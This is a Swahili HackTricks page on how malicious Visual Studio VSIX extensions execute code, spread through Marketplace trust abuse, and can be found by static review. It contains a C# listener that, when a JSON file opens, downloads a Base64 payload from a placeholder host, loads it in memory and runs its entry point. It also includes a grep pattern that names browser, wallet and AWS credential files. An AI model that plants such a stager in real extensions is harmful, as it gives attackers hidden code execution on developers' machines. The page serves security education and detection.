# Matumizi Mabaya ya Kiendelezi cha Visual Studio VSIX

{{#include ../banners/hacktricks-training.md}}

Kiendelezi cha Visual Studio kinaweza kugeuza shughuli za kawaida za kuhariri kuwa utekelezaji wa msimbo kwa kutumia utambulisho wa mtumiaji aliyeingia. VSIX hasidi, mchapishaji anayejifanya kuwa mwingine, au sasisho la kiendelezi lililoathiriwa linaweza kumfikia mtumiaji kupitia njia za kawaida za usakinishaji. Kusakinisha kwa kuombwa ruhusa ya msimamizi ni njia ya usakinishaji inayohitaji idhini, si upandishaji wa mapendeleo wa kiotomatiki.<sup>[[1]](#references)</sup>

## Muundo wa utekelezaji

Viendelezi vya kawaida vya VSSDK hutekelezwa ndani ya `devenv.exe`. Muundo mpya zaidi wa `VisualStudio.Extensibility` huendesha hasa viendelezi vya kisasa vya .NET nje ya mchakato: Visual Studio huelekeza miito kwa mchakato maalumu wa `Microsoft.ServiceHub.Host.Extensibility`, hivyo kutenga uthabiti wa IDE, lakini **haizuii** kiendelezi kutumia ruhusa za Windows za mtumiaji. Jina halisi la faili inayotekelezeka linaweza kuwa na kiambishi tamati cha usanifu, kama vile `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Kuanzisha kwenye shughuli za kawaida za kuhariri

Badala ya kutoa tu amri ya menyu inayoonekana wazi, kiendelezi kinaweza kutekeleza `ITextViewOpenClosedListener`. Callback yake ya `TextViewOpenedAsync` huitwa kwa nyaraka zinazolingana, huku `TextViewExtensionConfiguration.AppliesTo` ikiruhusu kuweka kikomo cha uanzishaji kwa aina ya kawaida kama JSON. Kifomati au linta halisi bado inaweza kutekeleza kazi yake iliyotangazwa huku kitendo cha pili kikiendeshwa kama athari ya pembeni wakati wa kufungua faili.<sup>[[1]](#references)[[3]](#references)</sup>

Mchoro huu uliorahisishwa unaonyesha sehemu muhimu za utekelezaji; umeacha nje kifomati halali na ushughulikiaji wa makosa kwa ajili ya uwazi.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Kipakiaji cha assembly inayosimamiwa kwenye kumbukumbu kinachoanzishwa na tukio</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Msururu huu hupakua maandishi ya Base64, kuyafungua na kupata baiti za assembly, kisha huyapakia kutoka kwenye `MemoryStream` kupitia `AssemblyLoadContext` inayoweza kupakuliwa, huendesha `EntryPoint` iliyopatikana kwa reflection ikiwa na vigezo au bila vigezo, husubiri entry point za asynchronous, na kupakua context. Hatua ya pili haiandikwi kwenye diski, ingawa VSIX na DLL kuu ya extension hubaki kama mabaki kwenye diski. Base64 haitoi uhalisi wala usiri; kutumia HTTP pia huruhusu mshambuliaji aliye katikati ya njia kubadilisha jibu.<sup>[[1]](#references)</sup>

Tofauti za kiutendaji ni pamoja na kuficha exceptions zote ili kipengele kilichotangazwa kiendelee kufanya kazi staging inaposhindwa, au kutumia `ITextViewChangedListener` kuanzisha utekelezaji baada ya mabadiliko. Msimbo hutekelezwa kwenye extension host na unaweza kutumia managed APIs, P/Invoke, faili, vitambulisho, na michakato ya child inayopatikana kwa mtumiaji huyo.<sup>[[1]](#references)</sup>

Kwa sehemu nyingine ya utekelezaji inayohusiana na editor na inayotegemea native plugin autoloading, angalia:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Unyanyasaji wa uaminifu wa Marketplace na uwasilishaji

VSIX inaweza kufika kama faili iliyoshirikiwa moja kwa moja/iliyotumwa kwa phishing, kutoka Marketplace ya wavuti, au kupitia kivinjari cha Marketplace kilichojengewa ndani ya Visual Studio. Usajili wa publisher unaotekeleza hasa upekee na orodha ya maneno yaliyohifadhiwa unaweza kuruhusu utambulisho wa publisher unaofanana kwa mwonekano; kumiliki akaunti ya publisher au extension inayoaminika tayari ni bora zaidi kwa mshambuliaji kwa sababu hurithi watumiaji waliokwisha isakinisha. Kusakinisha kupitia Marketplace huanzisha Visual Studio Installer na kwa muda huweka VSIX iliyopakuliwa chini ya `%LOCALAPPDATA%\Temp`; `payload.vsix` pia hutumiwa kwa matumizi halali, kwa hiyo jina la faili pekee si kiashiria.<sup>[[1]](#references)</sup>

MDSec haikubaini URL protocol ya Visual Studio inayosakinisha extension moja kwa moja. Opereta bado anahitaji mtumiaji asakinishe/aiamini VSIX, au lazima ahatarishe njia ya usambazaji ya extension iliyopo. Kifurushi cha `AllUsers` husakinishwa chini ya folda ya usakinishaji ya Visual Studio na kinaweza kuomba ruhusa za juu, lakini huu ni utaratibu wa kawaida wa installer unaohitaji idhini, si njia ya moja kwa moja ya kupata ruhusa za administrator au SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Ukaguzi tuli kwa kiwango kikubwa

Vifurushi vya VSIX kwa kawaida ni kontena za ZIP, kwa hiyo pipeline salama ya ukaguzi wa Marketplace inaweza kuorodhesha vifurushi, kuvifungua **bila kupakia msimbo wa extension**, kuchanganua manifests, kutambua sehemu za utekelezaji, na kufanya decompile ya managed assemblies kwa `ilspycmd`. Weka kipaumbele kwa assemblies zinazomilikiwa na extension baada ya kuondoa dependencies za kawaida zilizofungashwa pamoja, kisha linganisha strings za hifadhi za vitambulisho na makundi ya tabia kama vile kusoma faili pamoja na kutuma kwenye mtandao, kusimba pamoja na kutuma, kupakua pamoja na kutekeleza, kufikia credential manager pamoja na mtandao, au kupiga picha ya skrini pamoja na kuituma.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Pia kagua DLLs za native, targets za MSBuild, scripts, templates za T4 na payloads za visakinishi badala ya kudhani kila sehemu ya utekelezaji ni managed code. Linganisha tabia inayotiliwa shaka na madhumuni yaliyotajwa kwenye manifest; telemetry na visasishia halali vinaweza kufanana na uhamishaji wa data au staging. Ukaguzi wa static pekee hukosa code iliyofungashwa, iliyofichwa, inayotatuliwa kwa nguvu na isiyotumika kwa sasa, na kukagua toleo jipya zaidi pekee hukosa matoleo hasidi ya zamani.<sup>[[1]](#references)</sup>

VS Code hutumia extension host na manifest tofauti. Kwa share inayoweza kuandikwa na inayotumiwa kusakinisha kiotomatiki extension ya VS Code, tazama [utekelezaji kupitia share ya kudondoshea extension ya VS Code](vscode-extension-abuse.md).

Shambulio tofauti la kupakia project linaweza kutekeleza [target hasidi ya MSBuild `GetFrameworkPaths`](visual-studio-project-msbuild-execution.md) bila kusakinisha VSIX.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Viendelezi vya Visual Studio Vimechunguzwa Tena](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Kuhusu VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Muundo wa kifurushi cha VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - zana ya .NET ya ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Kampeni ya Blinder Tunnel Yalenga Miundombinu ya Iraq](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
